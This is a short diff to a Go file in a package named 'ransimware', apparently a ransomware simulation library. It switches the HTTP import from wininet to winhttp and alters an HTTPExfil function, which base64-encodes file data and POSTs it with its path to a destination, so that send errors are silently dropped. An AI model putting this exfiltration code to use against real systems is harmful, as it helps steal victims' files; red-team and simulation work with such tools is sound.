@@ -5,14 +5,13 @@ package ransimware
 import (
 	"bytes"
 	"encoding/base64"
-	"fmt"
 	"io"
 	"os"
 	"unsafe"
 
 	"golang.org/x/sys/windows"
 
-	"gitlab.com/mjwhitta/wininet/http"
+	"gitlab.com/mjwhitta/winhttp/http"
 )
 
 // HTTPExfil will return a function pointer to an ExfilFunc that
@@ -38,9 +37,7 @@ func HTTPExfil(dst string, headers map[string]string) ExfilFunc {
 			data = []byte(path + " " + b64)
 
 			// Send Message
-			if _, e = http.Post(dst, headers, data); e != nil {
-				fmt.Println(e.Error())
-			}
+			http.Post(dst, headers, data)
 		}
 	}
 }
